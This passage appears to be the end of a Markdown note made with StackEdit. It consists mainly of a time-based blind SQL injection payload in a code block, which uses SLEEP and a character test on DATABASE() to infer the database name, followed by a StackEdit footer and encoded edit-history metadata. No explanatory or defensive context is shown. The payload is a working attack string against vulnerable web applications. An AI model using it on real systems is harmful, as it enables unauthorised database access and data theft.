...
(SELECT(SLEEP(5-(IF(ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))>64,0,5)))))qnyz) AND 'SSDT'='SSDT'
```

> Written with [StackEdit中文版](https://stackedit.cn/).
>
<!--stackedit_data:
eyJoaXN0b3J5IjpbMTAwMTYxMDIyOSwxODQxNzY3NzcxLDIwMz
Q3MDAyMTAsOTAxNjAzNzM4LC0xMzM2NjYzNTE1LDE2MDI2NDcx
MDgsMjAzNzYwOTcwMiwxMDc1MzM3NjksMTc2OTMyNjk4MSwyMD
IwMTMwMDI4LDI2NDY0MTYwMywyMTI4NTczMTY4LC02NjExOTQ4
NzYsLTIyMDEyNjE2MCwtODk3OTY3NjcxLDE0MDUxNjIzNDksMT
A4ODczNzM0NSwyNjkyMDUwOTMsLTI1MTM4NjQ5MywtNDk4NzAw
NTI4XX0=
-->